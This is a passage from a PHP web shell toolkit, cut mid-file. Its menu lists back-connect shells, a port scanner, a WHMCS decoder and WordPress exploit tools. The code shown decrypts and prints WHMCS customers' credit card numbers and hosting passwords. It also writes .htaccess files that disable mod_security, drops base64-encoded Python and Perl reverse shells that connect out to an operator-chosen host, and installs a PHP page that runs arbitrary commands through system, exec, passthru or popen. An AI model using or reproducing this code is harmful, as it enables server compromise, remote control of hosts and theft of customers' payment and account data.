			$query = mysql_query("SELECT id FROM tblclients WHERE issuenumber != '' ORDER BY id DESC");
			echo "<br/><br/><center><table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='10'><nobr><span> CLIENTS CREDIT CARD </span></nobr></th></tr> 
	<tr>
	<th class='th_home' align='center'><b>CardType</b></th>
	<th class='th_home' align='center'><b>CardNumb</b></th>
	<th class='th_home' align='center'><b>Expdate</b></th>
	<th class='th_home' align='center'><b>IssueNumber</b></th>
	<th class='th_home' align='center'><b>FirstName</b></th>
	<th class='th_home' align='center'><b>LastName</b></th>
	<th class='th_home' align='center'><b>Address</b></th>
	<th class='th_home' align='center'><b>Country</b></th> 
	<th class='th_home' align='center'><b>Phone</b></th>
	<th class='th_home' align='center'><b>Email</b></th> 
	</tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='10' align='center'>Nothing Found ! :(</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				$cchash = md5($cc_encryption_hash . $v['0']);
				$s = mysql_query("SELECT firstname,lastname,address1,country,phonenumber,cardtype,email,AES_DECRYPT(cardnum,'" . $cchash . "') as cardnum,AES_DECRYPT(expdate,'" . $cchash . "') as expdate,AES_DECRYPT(issuenumber,'" . $cchash . "') as issuenumber FROM tblclients WHERE id='" . $v['0'] . "'");
				$v2 = mysql_fetch_array($s);
				echo "<tr>
	<td class='td_home' align='center'>" . $v2['cardtype'] . "</td>
	<td class='td_home' align='center'>" . $v2['cardnum'] . "</td>
	<td class='td_home' align='center'>" . $v2['expdate'] . "</td>
	<td class='td_home' align='center'>" . $v2['issuenumber'] . "</td>
	<td class='td_home' align='center'>" . $v2['firstname'] . "</td>
	<td class='td_home' align='center'>" . $v2['lastname'] . "</td>
	<td class='td_home' align='center'>" . $v2['address1'] . "</td>
	<td class='td_home' align='center'>" . $v2['country'] . "</td> 
	<td class='td_home' align='center'>" . $v2['phonenumber'] . "</td>
	<td class='td_home' align='center'>" . $v2['email'] . "</td></tr>";
			}
			echo "</table>";
			$query = mysql_query("SELECT *FROM tblhosting");
			echo "<br/><br/><center>
	<table class='table_home' style=width:830px;padding:0 1px;> 
	<tr><th colspan='6'><nobr><span> CLIENTS HOSTING ACCOUNT </span></nobr></th></tr> 
	<tr>
	<th class='th_home' align='center'><b>DOMAIN</b></th>
	<th class='th_home' align='center'><b>STATUS</b></th>
	<th class='th_home' align='center'><b>USERNAME</b></th>
	<th class='th_home' align='center'><b>PASSWORD</b></th>
	<th class='th_home' align='center'><b>DEDICATED IP</b></th>
	<th class='th_home' align='center'><b>ASSIGNED IP</b></th></tr>";
			if (!is_array(mysql_fetch_array($query))) {
				echo "<tr><td colspan='6' align='center'>Nothing Found !</td></tr>";
			}
			while ($v = mysql_fetch_array($query)) {
				echo "<tr>
	<td class='td_home' align='center'>{$v['domain']}</td>
	<td class='td_home' align='center'>{$v['domainstatus']}</td>
	<td class='td_home' align='center'>{$v['username']}</td>
	<td class='td_home' align='center'>" . dec($v['password'], $cc_encryption_hash) . "</td>
	<td class='td_home' align='center'>{$v['dedicatedip']}</td>
	<td class='td_home' align='center'>{$v['assignedips']}</td></tr>";
			}
			echo "</table>";
		}
}
elseif($_GET['do'] == 'hash') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
    if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "Hash type not found";
        }
    } else {
        $hashresult = "<center>Not Hash Entered</center>";
    }

	echo"<center>
	
		<form action='' method='POST'>
		<tr>
		<th colspan='5'>Hash Identification</th><br><br>
		<tr class='optionstr'><B><td>Enter Hash :</td><br></b><td></td>	<td><input type='text' name='hash' size='60' class='inputz' /></td><td><input type='submit' class='inputzbut' name='gethash' value='Identify Hash' /></td></tr><br>
		<tr class='optionstr'><b><td>Result</td><td>:</td><td></td></tr></b>
	</tr></form>
	</center>";
	echo "<center>$hashresult</center>";

}
elseif($_GET['do'] == 'portsc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
    echo"<form action='' method='post'>"              ;
    $start = strip_tags($_POST['start']);
    $end = strip_tags($_POST['end']);
    $host = strip_tags($_POST['host']);
    if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
        for ($i = $start;$i <= $end;$i++) {
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if ($fp) {
                echo 'Port ' . $i . ' is <font color=green>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<center><table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00ff00;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="end" value="5000"/></td>
   </tr><td><center><input class="inputzbut" type="submit" style="color:#00ff00" value="Scan Ports" />
   </td></form></center></table>';
    }

}
elseif($_GET['do'] == 'ptbc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
	mkdir('pyrevrshell', 0755);
	chdir('pyrevrshell');
	$seropil = ".htaccess";
	$angelinalll = "$seropil";
	$shitttyz = fopen ($angelinalll , 'w') or die ("shitttyz a&#231;&#305;lamad&#305;!");
	$dffvfdgfg = "<IfModule mod_security.c>
	SecFilterEngine Off
	SecFilterScanPOST Off
	</IfModule>";    
	fwrite ( $shitttyz , $dffvfdgfg ) ;
	fclose ($shitttyz);
	//extract python reverse script
	$vkffhd = 'IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHB0eQ0KIA0Kc2hlbGwgPSAiL2Jpbi9zaCINCiANCmRlZiB1c2FnZShwcm9ncmFtbmFtZSk6DQpwcmludCAieXRob24gY29ubmVjdC1iYWNrIGRvb3IiDQpwcmludCAiVXNhZ2U6ICVzIDxjb25uX2JhY2tfaXA+IDxwb3J0PiIgJSBwcm9ncmFtbmFtZQ0KIA0KZGVmIG1haW4oKToNCmlmIGxlbihzeXMuYXJndikgIT0zOg0KdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQpzeXMuZXhpdCgxKQ0KIA0KcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KIA0KdHJ5Og0Kcy5jb25uZWN0KChzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzeXMuYXJndlsxXSksaW50KHN5cy5hcmd2WzJdKSkpDQpwcmludCAiWytdQ29ubmVjdCBPSy4iDQpleGNlcHQ6DQpwcmludCAiWy1dQ2FuJ3QgY29ubmVjdCINCnN5cy5leGl0KDIpDQogDQpvcy5kdXAyKHMuZmlsZW5vKCksMCkNCm9zLmR1cDIocy5maWxlbm8oKSwxKQ0Kb3MuZHVwMihzLmZpbGVubygpLDIpDQpnbG9iYWwgc2hlbGwNCm9zLnVuc2V0ZW52KCJISVNURklMRSIpDQpvcy51bnNldGVudigiSElTVEZJTEVTSVpFIikNCnB0eS5zcGF3bihzaGVsbCkNCnMuY2xvc2UoKQ0KIA0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCm1haW4oKQ==';

	$jkol = fopen("reversesh.py" ,"w+");
	$write = fwrite ($jkol ,base64_decode($vkffhd));
	fclose($jkol);
	chmod("reversesh.py",0755);

	//extract php command shell
	$merdeeeee = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHl7IGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50ICFpbXBvcnRhbnQ7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDAwIDBweCAycHggN3B4O30gICAgICBhe3RleHQtZGVjb3JhdGlvbjpub25lOyBmb250LWZhbWlseTogVGFob21hLCBHZW5ldmE7IGNvbG9yOiMwMDc3MDA7IHBhZGRpbmc6MnB4IDJweDt9ICAgICAgYTpob3Zlcntjb2xvcjojMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDBmZjAwIDBweCAwcHggM3B4O30JICAuYXJlYSB7IGNvbG9yOiAjMDBiYjAwOyBmb250LXNpemU6IDlwdDsgdGV4dC1zaGFkb3c6IzAwMDAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiBzb2xpZCAwcHggIzAwNzcwMDsgYmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgfQkgIGlucHV0W3R5cGU9c3VibWl0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzcwOyAgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtYWxpZ246IGNlbnRlcjsgIHRleHQtc2hhZG93OiAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMyk7ICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgIGJvcmRlcjogMXB4IHNvbGlkICMyODQ0NzM7ICBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyAgYm9yZGVyLXJhZGl1czogNHB4OyAgY3Vyc29yOiBwb2ludGVyOyAgYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW1vei1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7ICAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyAgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7IH0gaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwOTkwMDsgdGV4dC1zaGFkb3c6ICM3Nzc3NzcgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NzAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7fSBpbnB1dFt0eXBlPXN1Ym1pdF06aG92ZXIsIGlucHV0W3R5cGU9dGV4dF06aG92ZXJ7IGNvbG9yOiAjZmZmZmZmOyB0ZXh0LXNoYWRvdzogIzAwNjYwMCAwcHggMHB4IDRweDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwZGQwMDsgYm9yZGVyOiAxcHggc29saWQgIzAwZGQwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gc2VsZWN0eyBwYWRkaW5nOiAzcHg7IHdpZHRoOiAxNjJweDsgY29sb3I6ICMwMGFhMDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGFhMDA7ICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4O30gc2VsZWN0OmhvdmVyeyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9ICAgI2NvbW1hbmRzeyBtYXJnaW4tbGVmdDogMzUwcHg7IG1hcmdpbi1yaWdodDogMzUwcHg7IH0gb3B0aW9ueyBjb2xvcjogIzc3Nzc3NzsgfTwvc3R5bGU+DQo8P3BocA0KZWNobyAnPGNlbnRlcj48Zm9udCBjb2xvcj0iIzAwNzcwMCIgZmFjZT0iVGFob21hIiBzdHlsZT0iZm9udC1zaXplOiAxMnB0Ij5Vc2FnZTogcmV2ZXJzZXNoLnB5IFtpcG11XSBbUG9ydG11XTwvZm9udD4nOw0KZWNobyc8cCBhbGlnbj0iY2VudGVyIj4gDQo8aW1nIGJvcmRlcj0iMCI+PC9wPjxmb250IGZhY2U9IkdlbmV2YSIgYWxpZ249ImNlbnRlciIgc2l6ZT0iMiIgY29sb3I9IiMwMDk5MDAiPiBDb2RlZCBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIDwvZm9udD48YnI+DQo8Zm9ybSBtZXRob2Q9Z2V0IGFjdGlvbj0iJy4kbWUuJyI+DQo8cD48dGV4dGFyZWEgY2xhc3M9ImFyZWEiIHJvd3M9IjEzIiBuYW1lPSJTMSIgY29scz0iNzAiID4nOw0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfR0VUWydleGVjbWV0aG9kJ10oJF9HRVRbJ2NvbW1hbmQnXSk7fQ0KaWYgKHN0cmxlbigkX1BPU1RbJ2NvbW1hbmQnXSk+MSAmJiAkX1BPU1RbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddPT0icG9wZW4iKXsNCnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9DQoNCmVjaG8nPC90ZXh0YXJlYT48L3A+DQo8cD48Y2VudGVyPklmIG5vdGhpbmcgd29yayBpdCBtZWFucyB0aGF0IHB5dGhvbiBpcyBub3QgZW5hYmxlZCBpbiB0aGlzIHNlcnZlciA6KDwvY2VudGVyPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxzdHJvbmc+Q29tbWFuZDogcHl0aG9uIHJldmVyc2UucHkgeW91cklQIFBvcnQ8L3N0cm9uZz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0idnciIHNpemU9IjUwIiB2YWx1ZT0iY21kIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIHNpemU9IjQzIj4gPHNlbGVjdCBuYW1lPWV4ZWNtZXRob2Q+DQo8b3B0aW9uIHZhbHVlPSJzeXN0ZW0iPlN5c3RlbTwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0iZXhlYyI+RXhlYzwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0icGFzc3RocnUiPlBhc3N0aHJ1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0icG9wZW4iPnBvcGVuPC9vcHRpb24+DQo8L3NlbGVjdD4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9wPjwvZm9ybT4nOw0KPz4=';
	$file = fopen("kiter.php" ,"w+");
	$write = fwrite ($file ,base64_decode($merdeeeee));
	fclose($file);
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Python Connect Shell Priv8</span><center><center><br><iframe src=pyrevrshell/kiter.php width=75% height=70% frameborder=0></iframe></div></center>'; 
}
elseif($_GET['do'] == 'pbc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
	mkdir('Backperlrev', 0755);
	chdir('Backperlrev');
	$kokwkwkwkwkw = ".htaccess";
	$wkwkwkwkw_adi = "$kokwkwkwkwkw";
	$wkwkwkwkw = fopen ($wkwkwkwkw_adi , 'w') or die ("wkwkwkwkw a&#231;&#305;lamad&#305;!");
	$zilzil = "<IfModule mod_security.c>
	SecFilterEngine Off
	SecFilterScanPOST Off
	</IfModule>";    
	fwrite ( $wkwkwkwkw , $zilzil ) ;
	fclose ($wkwkwkwkw);
	$shellololol = 'dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtICA9ICcvYmluL2Jhc2gnOw0KJEFSR0M9QEFSR1Y7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUlxuXG4iOw0KaWYgKCRBUkdDIT0yKSB7DQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7DQogICBkaWUgIkV4OiAkMCAxMjcuMC4wLjEgMjEyMSBcbiI7DQp9DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0IDooXG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdCA6KFxuIjsNCnByaW50ICJbKl0gUmVzb2x2aW5nIEhvc3ROYW1lXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0aW5nLi4uICRBUkdWWzBdIFxuIjsNCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0ZWQgdG8gcmVtb3RlIGhvc3QgXCEvIFxuIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUiAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVDtlY2hvIC0tPT1TeXN0ZW1pbmZvPT0tLTsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLTsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9PS0tOyBwd2Q7ZWNobzsgZWNobyAtLT09U2hlbGw9PS0tICIpOw0Kc3lzdGVtKCRzeXN0ZW0pOw==';

	$zerer = fopen("reverse.pl" ,"w+");
	$write = fwrite ($zerer ,base64_decode($shellololol));
	fclose($zerer);
	chmod("reverse.pl",0755);

	//extract php command shell
	$zonop = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQZXJsIENvbm5lY3QgU2hlbGwgUHJpdjg8L3RpdGxlPjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3d3dzE0LjB6ejAuY29tLzIwMTQvMDYvMDQvMjEvMzk2NTU0Mzk0LnBuZyIgdHlwZT0iaW1hZ2UveC1pY29uIiAvPjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5eyBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudCAhaW1wb3J0YW50OyBjb2xvcjogIzAwOTkwMDsgdGV4dC1zaGFkb3c6IzAwMCAwcHggMnB4IDdweDt9ICAgICAgYXt0ZXh0LWRlY29yYXRpb246bm9uZTsgZm9udC1mYW1pbHk6IFRhaG9tYSwgR2VuZXZhOyBjb2xvcjojMDA3NzAwOyBwYWRkaW5nOjJweCAycHg7fSAgICAgIGE6aG92ZXJ7Y29sb3I6IzAwOTkwMDsgdGV4dC1zaGFkb3c6IzAwZmYwMCAwcHggMHB4IDNweDt9CSAgLmFyZWEgeyBjb2xvcjogIzAwYmIwMDsgZm9udC1zaXplOiA5cHQ7IHRleHQtc2hhZG93OiMwMDAwMDAgMHB4IDJweCA3cHg7IGJvcmRlcjogc29saWQgMHB4ICMwMDc3MDA7IGJhY2tncm91bmQtY29sb3I6dHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDk5MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB